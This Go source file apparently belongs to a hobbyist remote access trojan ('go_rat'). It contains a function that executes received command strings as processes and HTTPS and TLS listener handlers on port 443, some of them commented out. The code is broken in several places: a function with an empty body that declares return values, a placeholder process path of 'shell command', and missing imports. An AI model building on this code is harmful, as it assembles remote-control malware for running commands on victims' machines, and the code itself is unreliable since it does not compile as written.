/*/
This file contains the functions necessary for executing commands, and controlling IO
https://gist.github.com/denji/12b3a568f092ab951456
/*/
package Core

import (
	"go_rat/pkg/shared_code/ErrorHandling"
	"log"
	"net/http"
	"os"
)

// trying out something I just learned
// attaching functions to types via pointers?
//  item to modify----- name of new func--- return types
func (MessageWrapper *AESPacket) Lex() (message *AESPacket, derp error) {

}

//function to execute command
// Takes a Command struct
// returns RatProcess struct
func exec_command(command_struct *Command) *RatProcess {
	shell_arguments := command_struct.Command_string
	attributes := os.ProcAttr{
		Dir: "./",
		// Env not used
		// File not used
	}
	herp, derp := os.StartProcess("shell command", shell_arguments, &attributes)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
		//return
	}
	new_process := RatProcess{
		Pid:     herp.Pid,
		Process: herp,
	}
	return &new_process
}

/*/
func hTTPServerCore(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("Hola migo, donde esta me gato loco?.\n"))
	// fmt.Fprintf(w, "This is an example server.\n")
	// io.WriteString(w, "This is an example server.\n")
}
/*/
func HttpsServerCore(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("Hola migo, donde esta me gato loco?.\n"))
	http.HandleFunc("/hello", func(rw http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		w.Write([]byte("Hola migo, donde esta me gato loco?.\n"))

	})
	err := http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

/*/
func HttpsServerCore() {
	log.SetFlags(log.Lshortfile)

	cer, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Println(err)
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	ln, err := tls.Listen("tcp", ":443", config)
	if err != nil {
		log.Println(err)
		return
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	r := bufio.NewReader(conn)
	for {
		msg, err := r.ReadString('\n')
		if err != nil {
			log.Println(err)
			return
		}

		println(msg)

		n, err := conn.Write([]byte("world\n"))
		if err != nil {
			log.Println(n, err)
			return
		}
	}
}
/*/
